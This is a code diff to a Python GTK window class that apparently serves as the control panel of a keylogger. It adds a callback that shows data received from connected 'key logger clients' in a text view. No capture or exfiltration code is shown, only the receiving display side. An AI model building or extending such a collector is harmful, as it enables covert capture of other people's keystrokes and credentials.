@@ -27,9 +27,14 @@ class ServerWindow:
     def __init__(self):
         self._log = logging.getLogger(__name__)
         self._log.debug('Gtk window init')
+        self._texts = ''
+
         self._builder = Gtk.Builder()
-        self._builder.add_from_file("ui.glade")
+        self._builder.add_from_file('ui.glade')
         self._builder.connect_signals(self)
+        self._mainwindow = self._builder.get_object('server_window')
+        self._textview = self._builder.get_object('text_view')
+        
         self.set_window_size()
         self._server_sock = ServerSocket()
 
@@ -38,11 +43,16 @@ class ServerWindow:
         Gtk.main_quit(*args)        
 
     def get_top_level_window(self):
-        return self._builder.get_object("server_window")
+        return self._mainwindow
+
+    def _callback(self, data):
+        textbuffer = self._textview.get_buffer()
+        self._texts += data
+        textbuffer.set_text(self._texts)
 
     def start_listening(self, widget):
         self._log.info('Starting listening to the key logger clients')
-        thread.start_new_thread(self._server_sock.start, ())
+        thread.start_new_thread(self._server_sock.start, (self._callback,))
 
     def stop_listening(self, widget):
         self._log.info('Stop listening to the key logger clients')
